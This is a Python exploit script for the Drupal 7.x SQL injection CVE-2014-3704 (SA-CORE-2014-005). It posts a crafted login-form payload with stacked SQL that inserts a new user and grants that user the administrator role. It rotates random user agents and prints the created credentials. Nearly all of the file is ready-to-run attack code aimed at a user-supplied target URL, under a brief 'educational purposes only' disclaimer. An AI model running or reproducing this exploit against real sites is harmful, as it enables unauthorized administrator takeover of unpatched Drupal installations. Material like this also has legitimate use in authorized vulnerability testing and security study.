#!/usr/bin/python
#
#
# Drupal 7.x SQL Injection SA-CORE-2014-005 https://www.drupal.org/SA-CORE-2014-005
# Inspired by yukyuk's P.o.C (https://www.reddit.com/user/fyukyuk)
#
# Tested on Drupal 7.31 with BackBox 3.x
#
# This material is intended for educational
# purposes only and the author can not be held liable for
# any kind of damages done whatsoever to your machine,
# or damages caused by some other,creative application of this material.
# In any case you disagree with the above statement,stop here.

import hashlib, urllib2, optparse, random, sys

# START - from drupalpass import DrupalHash # https://github.com/cvangysel/gitexd-drupalorg/blob/master/drupalorg/drupalpass.py
# Calculate a non-truncated Drupal 7 compatible password hash.
# The consumer of these hashes must truncate correctly.

class DrupalHash:

  def __init__(self, stored_hash, password):
    self.itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    self.last_hash = self.rehash(stored_hash, password)

  def get_hash(self):
    return self.last_hash

  def password_get_count_log2(self, setting):
    return self.itoa64.index(setting[3])

  def password_crypt(self, algo, password, setting):
    setting = setting[0:12]
    if setting[0] != '$' or setting[2] != '$':
      return False

    count_log2 = self.password_get_count_log2(setting)
    salt = setting[4:12]
    if len(salt) < 8:
      return False
    count = 1 << count_log2

    if algo == 'md5':
      hash_func = hashlib.md5
    elif algo == 'sha512':
      hash_func = hashlib.sha512
    else:
      return False
    hash_str = hash_func(salt + password).digest()
    for c in range(count):
      hash_str = hash_func(hash_str + password).digest()
    output = setting + self.custom64(hash_str)
    return output

  def custom64(self, string, count = 0):
    if count == 0:
      count = len(string)
    output = ''
    i = 0
    itoa64 = self.itoa64
    while 1:
      value = ord(string[i])
      i += 1
      output += itoa64[value & 0x3f]
      if i < count:
        value |= ord(string[i]) << 8
      output += itoa64[(value >> 6) & 0x3f]
      if i >= count:
        break
      i += 1
      if i < count:
        value |= ord(string[i]) << 16
      output += itoa64[(value >> 12) & 0x3f]
      if i >= count:
        break
      i += 1
      output += itoa64[(value >> 18) & 0x3f]
      if i >= count:
        break
    return output

  def rehash(self, stored_hash, password):
    # Drupal 6 compatibility
    if len(stored_hash) == 32 and stored_hash.find('$') == -1:
      return hashlib.md5(password).hexdigest()
      # Drupal 7
    if stored_hash[0:2] == 'U$':
      stored_hash = stored_hash[1:]
      password = hashlib.md5(password).hexdigest()
    hash_type = stored_hash[0:3]
    if hash_type == '$S$':
      hash_str = self.password_crypt('sha512', password, stored_hash)
    elif hash_type == '$H$' or hash_type == '$P$':
      hash_str = self.password_crypt('md5', password, stored_hash)
    else:
      hash_str = False
    return hash_str
# END - from drupalpass import DrupalHash # https://github.com/cvangysel/gitexd-drupalorg/blob/master/drupalorg/drupalpass.py

def randomAgentGen():

 userAgent =    ['Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
                'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10',
                'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.74.9 (KHTML, like Gecko) Version/7.0.2 Safari/537.74.9',
                'Mozilla/5.0 (X11; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
                'Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) GSA/4.1.0.31802 Mobile/11D257 Safari/9537.53',
                'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/36.0.1985.125 Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Safari/600.1.3',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36']

 UA = random.choice(userAgent)
 return UA


def urldrupal(url):
    if url[:8] != "https://" and url[:7] != "http://":
        print('[X] You must insert http:// or https:// procotol')
        sys.exit(1)
    # Page login
    url = url+'/?q=node&destination=node'
    return url


banner = """
  ______                          __     _______  _______ _____
 |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |
 |.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |
 |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |
 |:  1    /          |__|                 |   |  |:  1   | |:  |
 |::.. . /                                |   |  |::.. . | |::.|
 `------'                                 `---'  `-------' `---'
  _______       __     ___       __            __   __
 |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.
 |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |
 |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|
 |:  1   |  |__|      |:  |    |___|
 |::.. . |            |::.|
 `-------'            `---'

                                 Drup4l => 7.0 <= 7.31 Sql-1nj3ct10n
                                              Admin 4cc0unt cr3at0r

			  Discovered by:

			  Stefan  Horst
                         (CVE-2014-3704)

                           Written by:

                         Claudio Viviani

                      http://www.homelab.it

                         info@homelab.it
                     homelabit@protonmail.ch

                 https://www.facebook.com/homelabit
                   https://twitter.com/homelabit
                 https://plus.google.com/+HomelabIt1/
       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww

"""

commandList = optparse.OptionParser('usage: %prog -t http[s]://TARGET_URL -u USER -p PASS\n')
commandList.add_option('-t', '--target',
                  action="store",
                  help="Insert URL: http[s]://www.victim.com",
                  )
commandList.add_option('-u', '--username',
                  action="store",
                  help="Insert username",
                  )
commandList.add_option('-p', '--pwd',
                  action="store",
                  help="Insert password",
                  )
options, remainder = commandList.parse_args()

# Check args
if not options.target or not options.username or not options.pwd:
    print(banner)
    print
    commandList.print_help()
    sys.exit(1)

print(banner)

host = options.target
user = options.username
password = options.pwd

hash = DrupalHash("$S$CTo9G7Lx28rzCfpn4WB2hUlknDKv6QTqHaf82WLbhPT2K5TzKzML", password).get_hash()

target = urldrupal(host)


# Add new user:
# insert into users (status, uid, name, pass) SELECT 1, MAX(uid)+1, 'admin', '$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld' FROM users
#
# Set administrator permission (rid = 3):
# insert into users_roles (uid, rid) VALUES ((SELECT uid FROM users WHERE name = 'admin'), 3)
#
post_data = "name[0%20;insert+into+users+(status,+uid,+name,+pass)+SELECT+1,+MAX(uid)%2B1,+%27"+user+"%27,+%27"+hash[:55]+"%27+FROM+users;insert+into+users_roles+(uid,+rid)+VALUES+((SELECT+uid+FROM+users+WHERE+name+%3d+%27"+user+"%27),+3);;#%20%20]=test3&name[0]=test&pass=shit2&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"

UA = randomAgentGen()
try:
    req = urllib2.Request(target, post_data, headers={ 'User-Agent': UA })
    content = urllib2.urlopen(req).read()

    if "mb_strlen() expects parameter 1" in content:
        print "[!] VULNERABLE!"
        print
	print "[!] Administrator user created!"
	print
        print "[*] Login: "+str(user)
        print "[*] Pass: "+str(password)
        print "[*] Url: "+str(target)

    else:
        print "[X] NOT Vulnerable :("

except urllib2.HTTPError as e:

    print "[X] HTTP Error: "+str(e.reason)+" ("+str(e.code)+")"

except urllib2.URLError as e:

    print "[X] Connection error: "+str(e.reason)